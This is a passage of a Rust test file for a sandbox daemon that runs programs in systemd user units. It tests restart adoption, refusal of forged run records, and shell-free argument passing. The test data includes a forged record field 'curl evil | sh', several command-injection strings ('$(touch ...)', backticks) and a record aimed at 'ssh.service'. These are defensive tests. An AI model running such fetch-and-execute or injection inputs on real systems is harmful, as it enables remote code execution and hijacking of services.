//! Runs that live in units of the box user's manager (ADR 0038 section 4): a daemon that restarts finds its runs again,
//! a record that does not verify is refused, the program never passes through a shell, runs freeze and thaw.
//!
//! The box user's manager is a fake that "starts" a unit by running the real shim on a thread, so the shim, its socket,
//! its log and its status file are the real ones; the programs the runs execute are real too (`sh`, `cat`, `echo`).
#![allow(clippy::unwrap_used)]
#![cfg(unix)]

use std::collections::{BTreeMap, BTreeSet};
use std::fs;
use std::io;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use ozboxd::run_shim::{self, Request};
use ozboxd::run_units::{
    check_binding, id_of_unit, parse_exec_start, sha256_hex, systemd_run_args, unit_name, valid_id,
    RunRecord, SystemdUserUnits, UnitSpawner, UnitSpawnerConfig, UnitStart, UserUnits,
};
use ozboxd::runs::testing::{FakeCgroup, FakeMemory};
use ozboxd::runs::{PauseKind, RunConfig, RunManager, RunRequest, RunState, Spawner};
use ozboxd::timeutil::FakeClock;

const GIB: u64 = 1 << 30;
const T0: u64 = 1_794_182_400_000;

/// The box user's manager. `start` runs the shim for the unit on a thread; the unit is "active" until it returns.
#[derive(Default)]
struct FakeUnits {
    live: Arc<Mutex<BTreeMap<String, Vec<String>>>>,
    started: Mutex<Vec<UnitStart>>,
    frozen: Mutex<BTreeSet<String>>,
    killed: Mutex<Vec<String>>,
    down: AtomicBool,
    fail_freeze: AtomicBool,
    /// What the manager says the unit's main process is; absent = this test process (the shim runs on a thread of it).
    main_pid: Mutex<Option<u32>>,
    /// The manager cannot say which process is the unit's main one (`Ok(None)`).
    main_pid_unknown: AtomicBool,
}

impl FakeUnits {
    fn run_dir_of(args: &[String]) -> PathBuf {
        // run-shim <id> <hash> <runs dir>
        PathBuf::from(&args[3]).join(&args[1])
    }
    fn live_units(&self) -> Vec<String> {
        self.live.lock().unwrap().keys().cloned().collect()
    }
}

impl UserUnits for FakeUnits {
    fn start(&self, s: &UnitStart) -> io::Result<()> {
        if self.down.load(Ordering::SeqCst) {
            return Err(io::Error::other("no manager"));
        }
        self.started.lock().unwrap().push(s.clone());
        let mut cmd = vec![s.exe.to_string_lossy().into_owned()];
        cmd.extend(s.args.iter().cloned());
        self.live.lock().unwrap().insert(s.unit.clone(), cmd);
        let (live, unit, args) = (self.live.clone(), s.unit.clone(), s.args.clone());
        std::thread::spawn(move || {
            let dir = FakeUnits::run_dir_of(&args);
            let _ = run_shim::serve(&dir, &args[1], &args[2]);
            live.lock().unwrap().remove(&unit);
        });
        Ok(())
    }
    fn kill(&self, unit: &str) -> io::Result<()> {
        if !self.live.lock().unwrap().contains_key(unit) {
            return Err(io::Error::from(io::ErrorKind::NotFound));
        }
        self.killed.lock().unwrap().push(unit.to_string());
        // the real manager signals every process of the unit; here, the program the shim started
        let id = id_of_unit(unit).unwrap().to_string();
        let cmd = self.live.lock().unwrap().get(unit).cloned().unwrap();
        let sock = Self::run_dir_of(&cmd[1..]).join(run_shim::SOCK);
        let _ = id;
        if let Ok(r) = run_shim::call(&sock, &Request::Status, Duration::from_secs(2)) {
            if let Some(pid) = r.pid {
                let _ = std::process::Command::new("kill")
                    .args(["-9", &pid.to_string()])
                    .status();
            }
        }
        Ok(())
    }
    fn freeze(&self, unit: &str) -> io::Result<()> {
        if self.fail_freeze.load(Ordering::SeqCst) {
            return Err(io::Error::other("freezer"));
        }
        self.frozen.lock().unwrap().insert(unit.to_string());
        Ok(())
    }
    fn thaw(&self, unit: &str) -> io::Result<()> {
        if self.fail_freeze.load(Ordering::SeqCst) {
            return Err(io::Error::other("freezer"));
        }
        self.frozen.lock().unwrap().remove(unit);
        Ok(())
    }
    fn list(&self) -> io::Result<BTreeSet<String>> {
        if self.down.load(Ordering::SeqCst) {
            return Err(io::Error::other("no manager"));
        }
        Ok(self.live.lock().unwrap().keys().cloned().collect())
    }
    fn command_line(&self, unit: &str) -> io::Result<Option<Vec<String>>> {
        Ok(self.live.lock().unwrap().get(unit).cloned())
    }
    fn main_pid(&self, _unit: &str) -> io::Result<Option<u32>> {
        if self.main_pid_unknown.load(Ordering::SeqCst) {
            return Ok(None);
        }
        Ok(Some(
            self.main_pid
                .lock()
                .unwrap()
                .unwrap_or_else(std::process::id),
        ))
    }
    fn frozen(&self, unit: &str) -> bool {
        self.frozen.lock().unwrap().contains(unit)
    }
}

struct Rig {
    dir: tempfile::TempDir,
    units: Arc<FakeUnits>,
    clock: Arc<FakeClock>,
}

impl Rig {
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        fs::create_dir(dir.path().join("runs")).unwrap();
        fs::set_permissions(dir.path().join("runs"), fs::Permissions::from_mode(0o700)).unwrap();
        Self {
            dir,
            units: Arc::new(FakeUnits::default()),
            clock: Arc::new(FakeClock::new(T0)),
        }
    }
    fn runs_dir(&self) -> PathBuf {
        self.dir.path().join("runs")
    }
    fn spawner(&self) -> UnitSpawner {
        let mut cfg = UnitSpawnerConfig::new(self.runs_dir(), "/usr/local/bin/ozboxd");
        cfg.start_timeout = Duration::from_secs(10);
        UnitSpawner::new(cfg, self.units.clone(), self.clock.clone())
    }
    /// A daemon: a manager over a new spawner. Dropping it is the daemon stopping; the units stay with `FakeUnits`.
    fn daemon(&self) -> RunManager {
        RunManager::new(
            RunConfig::default(),
            Arc::new(FakeCgroup::default()),
            Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
            Arc::new(self.spawner()),
            self.clock.clone(),
        )
    }
}

fn argv(words: &[&str]) -> Vec<String> {
    words.iter().map(|s| s.to_string()).collect()
}

fn until<F: FnMut() -> bool>(what: &str, mut f: F) {
    let t = Instant::now();
    while t.elapsed() < Duration::from_secs(15) {
        if f() {
            return;
        }
        std::thread::sleep(Duration::from_millis(10));
    }
    panic!("timed out waiting for: {what}");
}

fn log_of(m: &RunManager, id: &str) -> String {
    let mut text = String::new();
    let mut from = 0;
    loop {
        let c = m.read_log(id, from).unwrap();
        text.push_str(&c.text);
        if c.next == from {
            return text;
        }
        from = c.next;
    }
}

#[test]
fn a_daemon_restart_while_a_run_is_going_leaves_the_run_going_and_it_is_taken_over() {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "echo started; cat"]));
    rq.stdin = Some("one\n".into());
    rq.keep_stdin_open = true;
    rq.labels.insert("kind".into(), "agent".into());
    rq.memory_request_bytes = GIB;
    rq.memory_max_bytes = Some(2 * GIB);
    let (id, st) = a.start(rq).unwrap();
    assert_eq!(st, RunState::Running);
    until("first output", || log_of(&a, &id).contains("one"));
    // the daemon stops: everything it held is dropped. The units are the manager's, so they are still there.
    drop(a);
    assert_eq!(rig.units.live_units(), [unit_name(&id)]);

    // the new daemon finds the run from its record
    let mut b = rig.daemon();
    let found = b.adopt_existing();
    assert_eq!((found.adopted, found.ended), (1, 0), "{found:?}");
    assert!(found.refused.is_empty(), "{:?}", found.refused);
    let info = b.list().into_iter().find(|r| r.id == id).unwrap();
    assert_eq!(info.state, RunState::Running);
    assert_eq!(info.program, "sh");
    assert_eq!(info.labels.get("kind").map(String::as_str), Some("agent"));
    assert_eq!(info.memory_max_bytes, Some(2 * GIB));
    // the output from before the restart is still readable from the same offset, and the run takes more input
    assert!(log_of(&b, &id).starts_with("started\none\n"));
    b.send_stdin(&id, "two\n", false).unwrap();
    until("the second line", || log_of(&b, &id).contains("two"));
    // ending its input ends the program; the new daemon sees the status
    b.send_stdin(&id, "", true).unwrap();
    until("the run ends", || {
        b.tick();
        b.list()
            .iter()
            .any(|r| r.id == id && r.state == RunState::Exited)
    });
    assert_eq!(b.list()[0].exit_code, Some(0));
    rig.clock.advance(1_000);
    let c = b.read_log(&id, 0).unwrap();
    assert_eq!(c.exit_code, Some(0));
}

#[test]
fn a_run_that_ended_while_no_daemon_was_looking_joins_the_history_with_its_output_and_status() {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let (id, _) = a
        .start(RunRequest::new(argv(&["sh", "-c", "echo done; exit 3"])))
        .unwrap();
    drop(a);
    until("the unit ends", || rig.units.live_units().is_empty());
    let mut b = rig.daemon();
    let found = b.adopt_existing();
    assert_eq!((found.adopted, found.ended), (0, 1), "{found:?}");
    let info = b.list().into_iter().find(|r| r.id == id).unwrap();
    assert_eq!(info.state, RunState::Exited);
    assert_eq!(info.exit_code, Some(3));
    rig.clock.advance(1_000);
    assert_eq!(log_of(&b, &id), "done\n");
}

#[test]
fn a_controlled_runs_capability_still_gates_it_after_the_restart() {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    rq.labels
        .insert(ozboxd::runs::BROWSER_LABEL.into(), "1".into());
    let (id, _, cap) = a.start_controlled(rq).unwrap();
    // what is on disk is the hash, never the capability
    let record = fs::read_to_string(rig.runs_dir().join(&id).join("run.json")).unwrap();
    assert!(!record.contains(&cap), "{record}");
    assert!(record.contains("cap_sha256"));
    drop(a);
    let mut b = rig.daemon();
    assert_eq!(b.adopt_existing().adopted, 1);
    assert!(b.authorized(&id, Some(&cap)));
    assert!(!b.authorized(&id, None));
    assert!(!b.authorized(&id, Some("ozc_wrong")));
    b.stop(&id).unwrap();
    until("killed", || {
        b.tick();
        b.list().iter().any(|r| r.state == RunState::Exited)
    });
}

fn adopt_refusals(rig: &Rig) -> (usize, Vec<(String, String)>) {
    let mut m = rig.daemon();
    let s = m.adopt_existing();
    (s.adopted + s.ended, s.refused)
}

fn start_waiting_run(rig: &Rig) -> String {
    let mut a = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    let (id, _) = a.start(rq).unwrap();
    id
}

#[test]
fn a_record_changed_after_its_run_started_is_refused_not_adopted_and_the_run_is_left_alone() {
    let rig = Rig::new();
    let id = start_waiting_run(&rig);
    let path = rig.runs_dir().join(&id).join("run.json");
    // someone edits the record (here: gives the run another memory request)
    let edited = fs::read_to_string(&path)
        .unwrap()
        .replace("\"memory_request_bytes\": 0", "\"memory_request_bytes\": 1");
    fs::write(&path, edited).unwrap();
    let (taken, refused) = adopt_refusals(&rig);
    assert_eq!(taken, 0);
    assert_eq!(refused.len(), 1, "{refused:?}");
    assert_eq!(refused[0].0, id);
    assert!(refused[0].1.contains("changed since"), "{refused:?}");
    // reported, never touched: the unit was not killed, and its record is as it was left
    assert!(rig.units.killed.lock().unwrap().is_empty());
    assert_eq!(rig.units.live_units(), [unit_name(&id)]);
}

#[test]
fn a_foreign_record_is_refused_whatever_is_wrong_with_it() {
    let rig = Rig::new();
    let id = start_waiting_run(&rig);
    let runs = rig.runs_dir();
    let good = fs::read_to_string(runs.join(&id).join("run.json")).unwrap();

    // 1. a record copied from another run into this one's folder: it names another run
    let other = "ab12cd";
    fs::create_dir(runs.join(other)).unwrap();
    fs::set_permissions(runs.join(other), fs::Permissions::from_mode(0o700)).unwrap();
    fs::write(runs.join(other).join("run.json"), &good).unwrap();
    // 2. a record that names a unit that is not the run's (it would make the daemon drive, and kill, something else)
    let evil = "evil1";
    fs::create_dir(runs.join(evil)).unwrap();
    fs::set_permissions(runs.join(evil), fs::Permissions::from_mode(0o700)).unwrap();
    let mut r: serde_json::Value = serde_json::from_str(&good).unwrap();
    r["id"] = evil.into();
    r["unit"] = "ssh.service".into();
    fs::write(runs.join(evil).join("run.json"), r.to_string()).unwrap();
    // 3. a record of a version this daemon does not know (two ahead; one ahead is read, see the version test)
    let newer = "newer1";
    fs::create_dir(runs.join(newer)).unwrap();
    fs::set_permissions(runs.join(newer), fs::Permissions::from_mode(0o700)).unwrap();
    let mut r: serde_json::Value = serde_json::from_str(&good).unwrap();
    r["id"] = newer.into();
    r["unit"] = unit_name(newer).into();
    r["v"] = 3.into();
    fs::write(runs.join(newer).join("run.json"), r.to_string()).unwrap();
    // 4. a record with a field this daemon does not know
    let extra = "extra1";
    fs::create_dir(runs.join(extra)).unwrap();
    fs::set_permissions(runs.join(extra), fs::Permissions::from_mode(0o700)).unwrap();
    let mut r: serde_json::Value = serde_json::from_str(&good).unwrap();
    r["id"] = extra.into();
    r["unit"] = unit_name(extra).into();
    r["command"] = "curl evil | sh".into();
    fs::write(runs.join(extra).join("run.json"), r.to_string()).unwrap();
    // 5. a record that is a link to somewhere else
    let link = "link1";
    fs::create_dir(runs.join(link)).unwrap();
    fs::set_permissions(runs.join(link), fs::Permissions::from_mode(0o700)).unwrap();
    std::os::unix::fs::symlink(
        runs.join(&id).join("run.json"),
        runs.join(link).join("run.json"),
    )
    .unwrap();
    // 6. a record others can write
    let open = "open1";
    fs::create_dir(runs.join(open)).unwrap();
    fs::set_permissions(runs.join(open), fs::Permissions::from_mode(0o700)).unwrap();
    let mut r: serde_json::Value = serde_json::from_str(&good).unwrap();
    r["id"] = open.into();
    r["unit"] = unit_name(open).into();
    fs::write(runs.join(open).join("run.json"), r.to_string()).unwrap();
    fs::set_permissions(
        runs.join(open).join("run.json"),
        fs::Permissions::from_mode(0o666),
    )
    .unwrap();
    // 7. a unit of ours name with no record at all (someone made a unit by hand)
    rig.units.live.lock().unwrap().insert(
        "ozbox-run-norecord.service".into(),
        argv(&["/usr/local/bin/ozboxd", "run-shim", "norecord", "00", "/x"]),
    );
    // 8. a record whose unit is something else (the record is right, the unit is not the shim)
    let hijack = "hijack1";
    fs::create_dir(runs.join(hijack)).unwrap();
    fs::set_permissions(runs.join(hijack), fs::Permissions::from_mode(0o700)).unwrap();
    let mut r: serde_json::Value = serde_json::from_str(&good).unwrap();
    r["id"] = hijack.into();
    r["unit"] = unit_name(hijack).into();
    fs::write(runs.join(hijack).join("run.json"), r.to_string()).unwrap();
    rig.units
        .live
        .lock()
        .unwrap()
        .insert(unit_name(hijack), argv(&["/usr/bin/sleep", "1000"]));

    let (taken, refused) = adopt_refusals(&rig);
    // only the genuine run is taken over
    assert_eq!(taken, 1);
    let refused: BTreeMap<String, String> = refused.into_iter().collect();
    let why = |id: &str| refused.get(id).cloned().unwrap_or_default();
    assert!(why(other).contains("another run"), "{refused:?}");
    assert!(why(evil).contains("not this run's"), "{refused:?}");
    assert!(why(newer).contains("version"), "{refused:?}");
    assert!(why(extra).contains("fields"), "{refused:?}");
    assert!(why(link).contains("not a plain file"), "{refused:?}");
    assert!(why(open).contains("written by others"), "{refused:?}");
    assert!(why("norecord").contains("record"), "{refused:?}");
    assert!(why(hijack).contains("not a run shim"), "{refused:?}");
    assert_eq!(refused.len(), 8, "{refused:?}");
    // none of the refused was touched
    assert!(rig.units.killed.lock().unwrap().is_empty());
}

#[test]
fn the_manager_not_answering_adopts_nothing_and_says_so() {
    let rig = Rig::new();
    let _id = start_waiting_run(&rig);
    rig.units.down.store(true, Ordering::SeqCst);
    let (taken, refused) = adopt_refusals(&rig);
    assert_eq!(taken, 0);
    assert_eq!(refused.len(), 1);
    assert!(refused[0].1.contains("did not answer"), "{refused:?}");
}

#[test]
fn the_binding_between_a_record_and_its_unit_is_exact() {
    let runs = Path::new("/work/.ozbox/runs");
    let rec = b"{}";
    let h = sha256_hex(rec);
    let ok = argv(&[
        "/usr/local/bin/ozboxd",
        "run-shim",
        "a1",
        &h,
        "/work/.ozbox/runs",
    ]);
    assert!(check_binding(&ok, "a1", rec, runs).is_ok());
    // another run's id, another record, another folder, another program, another shape
    assert!(check_binding(&ok, "a2", rec, runs)
        .unwrap_err()
        .contains("another run"));
    assert!(check_binding(&ok, "a1", b"{ }", runs)
        .unwrap_err()
        .contains("changed since"));
    assert!(check_binding(&ok, "a1", rec, Path::new("/tmp"))
        .unwrap_err()
        .contains("another folder"));
    let mut sh = ok.clone();
    sh[0] = "/bin/sh".into();
    assert!(check_binding(&sh, "a1", rec, runs)
        .unwrap_err()
        .contains("not a run shim"));
    assert!(check_binding(&ok[..4], "a1", rec, runs).is_err());
}

#[test]
fn program_arguments_never_pass_through_a_shell_nor_into_a_unit() {
    let rig = Rig::new();
    let mut m = rig.daemon();
    let canary = rig.dir.path().join("pwned");
    let nasty = [
        format!("$(touch {})", canary.display()),
        format!("; touch {}", canary.display()),
        format!("`touch {}`", canary.display()),
        "a b  c".to_string(),
        "'quoted' \"double\" \\ * ? > < | &".to_string(),
        "--secret-token-in-argv".to_string(),
    ];
    let mut words = vec!["/bin/echo".to_string()];
    words.extend(nasty.iter().cloned());
    let mut rq = RunRequest::new(words);
    rq.cwd = Some(rig.dir.path().to_path_buf());
    rq.env
        .insert("SECRET_VALUE".into(), "hunter2-secret".into());
    rq.stdin = Some("a prompt that is secret\n".into());
    let (id, _) = m.start(rq).unwrap();
    until("the run ends", || {
        m.tick();
        m.list().iter().any(|r| r.state == RunState::Exited)
    });
    rig.clock.advance(1_000);
    // echo printed every argument whole and in order, as one line
    assert_eq!(log_of(&m, &id), format!("{}\n", nasty.join(" ")));
    assert!(!canary.exists(), "a shell ran part of an argument");
    // what the manager was asked to start has the shim and its ids, never the program's words, environment or input
    let started = rig.units.started.lock().unwrap().clone();
    assert_eq!(started.len(), 1);
    let flat = format!("{started:?} {:?}", systemd_run_args(&started[0]));
    for secret in nasty
        .iter()
        .map(String::as_str)
        .chain(["hunter2-secret", "a prompt that is secret"])
    {
        assert!(!flat.contains(secret), "{secret} reached the unit: {flat}");
    }
    assert_eq!(started[0].args[0], "run-shim");
    // and the record on disk has none of it either
    let record = fs::read_to_string(rig.runs_dir().join(&id).join("run.json")).unwrap();
    for secret in nasty
        .iter()
        .map(String::as_str)
        .chain(["hunter2-secret", "a prompt that is secret"])
    {
        assert!(!record.contains(secret), "{secret} reached the record");
    }
    // the environment did reach the program (a run that could not see it would be a different bug)
    let mut env_run = RunRequest::new(argv(&["/usr/bin/env"]));
    env_run
        .env
        .insert("SECRET_VALUE".into(), "hunter2-secret".into());
    let (eid, _) = m.start(env_run).unwrap();
    until("env ends", || {
        m.tick();
        m.list()
            .iter()
            .any(|r| r.id == eid && r.state == RunState::Exited)
    });
    rig.clock.advance(1_000);
    assert!(log_of(&m, &eid).contains("SECRET_VALUE=hunter2-secret"));
}

#[test]
fn a_program_that_cannot_be_started_is_a_run_that_ended_with_127_like_under_a_shell() {
    let rig = Rig::new();
    let mut m = rig.daemon();
    let (id, st) = m
        .start(RunRequest::new(argv(&["/no/such/program", "x"])))
        .unwrap();
    assert_eq!(st, RunState::Running);
    until("it ends", || {
        m.tick();
        m.list()
            .iter()
            .any(|r| r.id == id && r.state == RunState::Exited)
    });
    assert_eq!(m.list()[0].exit_code, Some(127));
    rig.clock.advance(1_000);
    assert!(log_of(&m, &id).contains("could not start"));
}

#[test]
fn the_units_limits_are_the_runs_limits_and_the_manager_makes_no_cgroup_of_its_own() {
    let rig = Rig::new();
    let cg = Arc::new(FakeCgroup::default());
    let mut m = RunManager::new(
        RunConfig {
            default_max_runtime_s: Some(600),
            ..RunConfig::default()
        },
        cg.clone(),
        Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
        Arc::new({
            let mut c = UnitSpawnerConfig::new(rig.runs_dir(), "/usr/local/bin/ozboxd");
            c.default_max_runtime_s = Some(600);
            UnitSpawner::new(c, rig.units.clone(), rig.clock.clone())
        }),
        rig.clock.clone(),
    );
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    rq.memory_request_bytes = GIB;
    rq.memory_max_bytes = Some(2 * GIB);
    rq.cpu_weight = Some(250);
    let (id, _) = m.start(rq).unwrap();
    let s = rig.units.started.lock().unwrap()[0].clone();
    assert_eq!(s.unit, unit_name(&id));
    assert_eq!(s.memory_max, Some(2 * GIB));
    assert_eq!(
        s.memory_high,
        Some(ozbox_core::memory_plan::high_for(2 * GIB))
    );
    assert_eq!(s.cpu_weight, 250);
    assert_eq!(
        s.runtime_max_s,
        Some(600 + ozboxd::run_units::RUNTIME_MAX_MARGIN_S)
    );
    // the manager wrote no scope, no limit and no pid into any cgroup
    assert_eq!(cg.scope_count(), 0);
    assert!(cg.files.lock().unwrap().is_empty());
    // usage and OOM events are read from the unit's own cgroup
    assert_eq!(m.active_scopes(), [(id.clone(), unit_name(&id))]);
    m.stop(&id).unwrap();
    until("stopped", || {
        m.tick();
        m.list().iter().any(|r| r.state == RunState::Exited)
    });
    assert_eq!(m.list()[0].exit_code, Some(137));
    assert_eq!(rig.units.killed.lock().unwrap().len(), 1);
}

#[test]
fn freeze_and_thaw_hold_the_queue_and_move_the_wall_clock_limit_by_the_time_frozen() {
    let rig = Rig::new();
    let mut m = RunManager::new(
        RunConfig::default(),
        Arc::new(FakeCgroup::default()),
        Arc::new(FakeMemory::new(16 * GIB, 8 * GIB)),
        Arc::new(rig.spawner()),
        rig.clock.clone(),
    );
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    rq.max_runtime_s = Some(100);
    let (id, _) = m.start(rq.clone()).unwrap();
    assert!(!m.is_frozen(&id));
    let report = m.pause(PauseKind::Freeze);
    assert_eq!(report.frozen, std::slice::from_ref(&id));
    assert!(report.failed.is_empty());
    assert!(m.is_frozen(&id));
    assert!(rig.units.frozen.lock().unwrap().contains(&unit_name(&id)));
    assert_eq!(m.paused(), Some(PauseKind::Freeze));
    // while frozen: a new run waits in the queue, and the frozen run's limit does not run out
    let (queued, st) = m.start(rq).unwrap();
    assert_eq!(st, RunState::Queued);
    rig.clock.advance(150_000);
    m.tick();
    assert!(
        m.list().iter().all(|r| r.state != RunState::Exited),
        "{:?}",
        m.list()
    );
    assert!(m.take_events().is_empty());
    // thawed: the queue goes on, and the frozen run has its full limit again (150 s frozen, so 100 s more)
    m.resume().unwrap();
    assert!(!m.is_frozen(&id));
    assert!(rig.units.frozen.lock().unwrap().is_empty());
    assert_eq!(m.paused(), None);
    m.tick();
    assert_eq!(
        m.list().iter().find(|r| r.id == queued).unwrap().state,
        RunState::Running
    );
    rig.clock.advance(99_000);
    m.tick();
    assert!(
        m.take_events().is_empty(),
        "the freeze counted against its limit"
    );
    rig.clock.advance(2_000);
    m.tick();
    // both the thawed run and the one that started at the thaw reach their 100 s now
    assert_eq!(m.take_events().len(), 2);
}

#[test]
fn a_run_that_will_not_freeze_is_named_and_a_run_that_will_not_thaw_keeps_the_pause() {
    let rig = Rig::new();
    let mut m = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    let (id, _) = m.start(rq).unwrap();
    rig.units.fail_freeze.store(true, Ordering::SeqCst);
    let report = m.pause(PauseKind::Freeze);
    assert!(report.frozen.is_empty());
    assert_eq!(report.failed.len(), 1);
    assert_eq!(report.failed[0].0, id);
    assert!(!m.is_frozen(&id));
    // the pause is in effect either way, and ends only when asked
    assert_eq!(m.paused(), Some(PauseKind::Freeze));
    m.resume().unwrap();
    assert_eq!(m.paused(), None);
    // frozen fine, then the thaw fails: the pause stays and the failure is returned, never swallowed
    rig.units.fail_freeze.store(false, Ordering::SeqCst);
    m.pause(PauseKind::Freeze);
    assert!(m.is_frozen(&id));
    rig.units.fail_freeze.store(true, Ordering::SeqCst);
    let failed = m.resume().unwrap_err();
    assert_eq!(failed[0].0, id);
    assert!(m.is_frozen(&id));
    assert_eq!(m.paused(), Some(PauseKind::Freeze));
    rig.units.fail_freeze.store(false, Ordering::SeqCst);
    m.resume().unwrap();
    assert!(!m.is_frozen(&id));
}

#[test]
fn a_replace_pause_freezes_nothing_lists_the_runs_and_holds_the_queue() {
    let rig = Rig::new();
    let mut m = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    let (id, _) = m.start(rq.clone()).unwrap();
    let report = m.pause(PauseKind::Replace);
    assert!(report.frozen.is_empty() && report.failed.is_empty());
    assert_eq!(
        report
            .running
            .iter()
            .map(|r| r.id.clone())
            .collect::<Vec<_>>(),
        std::slice::from_ref(&id)
    );
    assert!(rig.units.frozen.lock().unwrap().is_empty());
    assert_eq!(m.start(rq).unwrap().1, RunState::Queued);
}

#[test]
fn a_run_frozen_across_a_restart_is_still_known_to_be_frozen() {
    let rig = Rig::new();
    let mut a = rig.daemon();
    let mut rq = RunRequest::new(argv(&["sh", "-c", "cat"]));
    rq.stdin = Some(String::new());
    rq.keep_stdin_open = true;
    let (id, _) = a.start(rq).unwrap();
    a.pause(PauseKind::Freeze);
    drop(a);
    let mut b = rig.daemon();
    assert_eq!(b.adopt_existing().adopted, 1);
    assert!(b.is_frozen(&id));
}

#[test]
fn the_real_manager_is_driven_with_argv_arrays_at_the_box_users_runtime_directory() {
    let runner = Arc::new(ozbox_core::RecordingRunner::new());
    let units = SystemdUserUnits::new(runner.clone(), 1500);
    let s = UnitStart {
        unit: "ozbox-run-a1.service".into(),
        exe: "/usr/local/bin/ozboxd".into(),
        args: argv(&["run-shim", "a1", "deadbeef", "/work/.ozbox/runs"]),
        memory_max: Some(2 * GIB),
        memory_high: Some(2 * GIB / 10 * 9),
        memory_swap_max: Some(GIB),
        oom_group: true,
        oom_score_adj: 500,
        cpu_weight: 250,
        runtime_max_s: Some(3600),
        sandbox: Default::default(),
    };
    units.start(&s).unwrap();
    units.kill("ozbox-run-a1.service").unwrap();
    units.freeze("ozbox-run-a1.service").unwrap();
    units.thaw("ozbox-run-a1.service").unwrap();
    let calls = runner.calls();
    assert_eq!(calls.len(), 4);
    for c in &calls {
        assert_eq!(
            c.env.get("XDG_RUNTIME_DIR").map(String::as_str),
            Some("/run/user/1500")
        );
        assert_eq!(
            c.env.get("DBUS_SESSION_BUS_ADDRESS").map(String::as_str),
            Some("unix:path=/run/user/1500/bus")
        );
    }
    // the exact start: the properties, then `--`, then the shim as separate words
    assert_eq!(calls[0].program, "systemd-run");
    assert_eq!(
        calls[0].args,
        [
            "--user",
            "--quiet",
            "--no-block",
            "--collect",
            "--unit=ozbox-run-a1.service",
            "--property=KillMode=control-group",
            "--property=TimeoutStopSec=10",
            "--property=MemoryMax=2147483648",
            "--property=MemoryHigh=1932735276",
            "--property=MemorySwapMax=1073741824",
            "--property=OOMPolicy=kill",
            "--property=OOMScoreAdjust=500",
            "--property=CPUWeight=250",
            "--property=NoNewPrivileges=yes",
            "--property=RestrictSUIDSGID=yes",
            "--property=LockPersonality=yes",
            "--property=RuntimeMaxSec=3600",
            "--",
            "/usr/local/bin/ozboxd",
            "run-shim",
            "a1",
            "deadbeef",
            "/work/.ozbox/runs",
        ]
    );
    assert_eq!(
        calls[1].args,
        [
            "--user",
            "kill",
            "--signal=SIGKILL",
            "--kill-whom=all",
            "--",
            "ozbox-run-a1.service"
        ]
    );
    assert_eq!(
        calls[2].args,
        ["--user", "freeze", "--", "ozbox-run-a1.service"]
    );
    assert_eq!(
        calls[3].args,
        ["--user", "thaw", "--", "ozbox-run-a1.service"]
    );
}

#[test]
fn the_managers_answers_are_read_as_they_are_printed() {
    let runner = Arc::new(ozbox_core::RecordingRunner::new());
    let units = SystemdUserUnits::new(runner.clone(), 1500);
    runner.reply(ozbox_core::Output {
        status: Some(0),
        stdout: "ozbox-run-a1.service loaded active running Oz Box run\nozbox-run-b2.service loaded failed failed x\nother.service loaded active running y\n".into(),
        stderr: String::new(),
    });
    let listed = units.list().unwrap();
    assert_eq!(
        listed.into_iter().collect::<Vec<_>>(),
        ["ozbox-run-a1.service", "ozbox-run-b2.service"]
    );
    runner.reply(ozbox_core::Output {
        status: Some(0),
        stdout: "{ path=/usr/local/bin/ozboxd ; argv[]=/usr/local/bin/ozboxd run-shim a1 ff /work/.ozbox/runs ; ignore_errors=no ; start_time=[n/a] }\n".into(),
        stderr: String::new(),
    });
    assert_eq!(
        units.command_line("ozbox-run-a1.service").unwrap().unwrap(),
        [
            "/usr/local/bin/ozboxd",
            "run-shim",
            "a1",
            "ff",
            "/work/.ozbox/runs"
        ]
    );
    // no such unit: an empty value, not an error
    runner.reply(ozbox_core::Output {
        status: Some(0),
        stdout: "\n".into(),
        stderr: String::new(),
    });
    assert_eq!(units.command_line("ozbox-run-gone.service").unwrap(), None);
    // a manager that does not answer is an error, never an empty list
    runner.reply(ozbox_core::Output {
        status: Some(1),
        stdout: String::new(),
        stderr: "Failed to connect to bus".into(),
    });
    assert!(units.list().is_err());
    assert_eq!(parse_exec_start("nothing here"), None);
}

#[test]
fn ids_and_unit_names_are_plain_and_round_trip() {
    assert!(valid_id("179418240000a1"));
    for bad in ["", "../x", "a/b", "a b", "a.service", &"x".repeat(33)] {
        assert!(!valid_id(bad), "{bad:?}");
    }
    assert_eq!(id_of_unit(&unit_name("ab12")), Some("ab12"));
    assert_eq!(id_of_unit("sshd.service"), None);
    assert_eq!(id_of_unit("ozbox-run-.timer"), None);
}

#[test]
fn a_record_is_what_the_daemon_writes_and_nothing_else_parses() {
    let rec = RunRecord {
        v: 1,
        shim_proto: 1,
        id: "ab12".into(),
        unit: unit_name("ab12"),
        program: "sh".into(),
        labels: BTreeMap::new(),
        memory_request_bytes: 0,
        memory_max_bytes: None,
        cpu_weight: None,
        max_runtime_s: None,
        queued_ms: 1,
        started_ms: 2,
        keep_stdin_open: false,
        log_max_bytes: 1024,
        cap_sha256: None,
        daemon_cgroup: None,
    };
    let bytes = serde_json::to_vec(&rec).unwrap();
    assert_eq!(RunRecord::parse(&bytes).unwrap(), rec);
    let bad = |f: &dyn Fn(&mut serde_json::Value)| {
        let mut v: serde_json::Value = serde_json::from_slice(&bytes).unwrap();
        f(&mut v);
        RunRecord::parse(v.to_string().as_bytes()).is_err()
    };
